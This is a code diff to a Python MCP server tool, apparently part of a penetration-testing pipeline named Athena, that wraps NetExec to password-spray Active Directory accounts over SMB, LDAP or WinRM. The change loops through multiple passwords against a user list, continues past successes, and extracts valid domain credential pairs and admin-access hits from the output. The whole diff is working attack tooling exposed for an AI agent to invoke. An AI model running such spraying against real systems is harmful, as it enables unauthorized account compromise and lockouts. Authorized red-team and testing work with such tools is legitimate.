@@ -8,7 +8,9 @@ to integrate with Athena's fact collection pipeline.
 
 import asyncio
 import json
+import os
 import re
+import tempfile
 
 from mcp.server.fastmcp import FastMCP
 from mcp.server.transport_security import TransportSecuritySettings
@@ -115,13 +117,15 @@ async def netexec_password_spray(
     password: str,
     domain: str,
     protocol: str = "smb",
+    password_list: str = "",
 ) -> str:
     """Password spraying attack (supports SMB/LDAP/WinRM).
 
     Args:
         target: Target IP or CIDR
         username_list: Comma-separated usernames or path to file
-        password: Password to spray
+        password: Single password to spray (use password_list for multiple)
+        password_list: Comma-separated passwords to try (overrides password)
         domain: AD domain name
         protocol: Protocol to use (smb, ldap, winrm)
 
@@ -129,38 +133,44 @@ async def netexec_password_spray(
         JSON with facts: credential.valid_pair, ad.sprayed_account
     """
     facts: list[dict[str, str]] = []
+    all_output: list[str] = []
 
+    passwords = [p.strip() for p in password_list.split(",") if p.strip()] if password_list else [password]
+    usernames = [u.strip() for u in username_list.split(",") if u.strip()] if "," in username_list else [username_list]
+
+    # Write usernames to a temp file — multiple -u flags only keep the last entry in nxc
+    user_file = None
     try:
-        cmd = ["nxc", protocol, target, "-d", domain]
+        with tempfile.NamedTemporaryFile(mode="w", suffix=".txt", delete=False) as f:
+            f.write("\n".join(usernames))
+            user_file = f.name
 
-        if "," in username_list:
-            for user in username_list.split(","):
-                user = user.strip()
-                if user:
-                    cmd.extend(["-u", user])
-        else:
-            cmd.extend(["-u", username_list])
+        for pw in passwords:
+            cmd = ["nxc", protocol, target, "-d", domain, "-u", user_file, "-p", pw, "--continue-on-success"]
 
-        cmd.extend(["-p", password, "--continue-on-success"])
+            stdout, stderr, rc = await _run_command(cmd, timeout=300)
+            combined = stdout + stderr
+            all_output.append(combined)
 
-        stdout, stderr, rc = await _run_command(cmd, timeout=300)
-        combined = stdout + stderr
+            for line in combined.splitlines():
+                stripped = line.strip()
+                if _NXC_SUCCESS.search(stripped):
+                    # Match DOMAIN\username — stop at colon or space to avoid duplicating password
+                    cred_match = re.search(r"\[\+\]\s+([\w.]+)\\([\w.@-]+)(?::|$|\s)", stripped)
+                    if cred_match:
+                        domain_part = cred_match.group(1)
+                        user_part = cred_match.group(2)
+                        facts.append({
+                            "trait": "credential.valid_pair",
+                            "value": f"{domain_part}\\{user_part}:{pw}",
+                        })
+                        facts.append({"trait": "ad.sprayed_account", "value": user_part})
 
-        for line in combined.splitlines():
-            stripped = line.strip()
-            if _NXC_SUCCESS.search(stripped):
-                cred_match = re.search(r"\[\+\]\s+(\S+)\\(\S+):(\S+)", stripped)
-                if cred_match:
-                    facts.append({
-                        "trait": "credential.valid_pair",
-                        "value": f"{cred_match.group(1)}\\{cred_match.group(2)}:{password}",
-                    })
-                    facts.append({"trait": "ad.sprayed_account", "value": cred_match.group(2)})
+                    if _NXC_PWNED.search(stripped):
+                        facts.append({"trait": "credential.valid_pair", "value": f"ADMIN_ACCESS:{stripped[:200]}"})
 
-                if _NXC_PWNED.search(stripped):
-                    facts.append({"trait": "credential.valid_pair", "value": f"ADMIN_ACCESS:{stripped[:200]}"})
-
-        return json.dumps({"facts": facts, "raw_output": combined[:4000]})
+        merged_output = "\n---\n".join(all_output)
+        return json.dumps({"facts": facts, "raw_output": merged_output[:4000]})
 
     except Exception as exc:
         return json.dumps({
@@ -168,6 +178,9 @@ async def netexec_password_spray(
             "raw_output": "",
             "error": {"type": type(exc).__name__, "message": str(exc)},
         })
+    finally:
+        if user_file and os.path.exists(user_file):
+            os.unlink(user_file)
 
 
 @mcp.tool()
